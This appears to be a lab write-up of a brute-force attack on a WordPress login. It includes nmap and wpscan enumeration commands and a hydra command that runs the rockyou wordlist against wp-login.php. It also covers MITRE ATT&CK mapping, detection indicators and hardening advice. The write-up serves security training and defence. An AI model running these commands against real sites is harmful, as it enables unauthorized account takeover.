 ## Attack Execution

### 1. Reconnaissance Phase
```bash
# Port scanning with Nmap
nmap -p- -A 

# WordPress enumeration
wpscan --url http:// --enumerate u
```
- Enumerated admin username in <30 seconds
- Identified WordPress login endpoint

### 2. Brute Force Attack
```bash
# Hydra brute force attack
hydra -l admin -P /usr/share/wordlists/rockyou.txt  http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=Invalid"
```

**Results:**
- Weak credentials cracked in <5 minutes
- ~1,200 password attempts
- Successful authentication achieved

## MITRE ATT&CK Mapping
- **T1110:** Brute Force
- **T1078:** Valid Accounts (post-compromise)
- **T1595:** Active Scanning

## Cyber Kill Chain Alignment
1. **Reconnaissance:** Port scanning, user enumeration
2. **Weaponization:** Prepared rockyou.txt wordlist
3. **Delivery:** HTTP POST requests to login endpoint
4. **Exploitation:** Credential validation
5. **Installation:** N/A (authentication-focused)
6. **Actions on Objectives:** Admin access obtained

## Indicators of Compromise (IoCs)

### Network Indicators
- Multiple failed login attempts from single IP
- High frequency HTTP POST requests to `/wp-login.php`
- Sequential password testing patterns

### Log Indicators
- Repeated authentication failures in access logs
- Same username, different passwords in short timeframe
- User-Agent: Hydra signatures

## Defensive Recommendations

### Immediate Actions
1. **Account Lockout Policy:** Lock account after 5 failed attempts for 15 minutes
2. **Fail2Ban Implementation:**
```bash
# Ban IP after 3 failures within 10 minutes
bantime = 3600
maxretry = 3
```
3. **Mandatory 2FA:** Enforce multi-factor authentication for all admin accounts

### Additional Hardening
- Rate limiting on login endpoints
- CAPTCHA after failed attempts
- Strong password policy enforcement (12+ chars, complexity requirements)
- Monitor auth logs with SIEM
- Implement IP allowlisting for admin access

## Tools Used
- **Kali Linux:** Penetration testing platform
- **Hydra:** Network login cracker
- **Nmap:** Network scanner
- **WPScan:** WordPress vulnerability scanner
- **VirtualBox:** Virtualization platform

## Learning Outcomes
- Practical understanding of brute force attack vectors
- SOC defensive strategy development
- Incident detection and response procedures
- Security control validation

## Disclaimer
This project was conducted in an isolated lab environment for educational purposes only. Unauthorized access to systems is illegal.

## References
- [MITRE ATT&CK T1110](https://attack.mitre.org/techniques/T1110/)
- [OWASP Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)
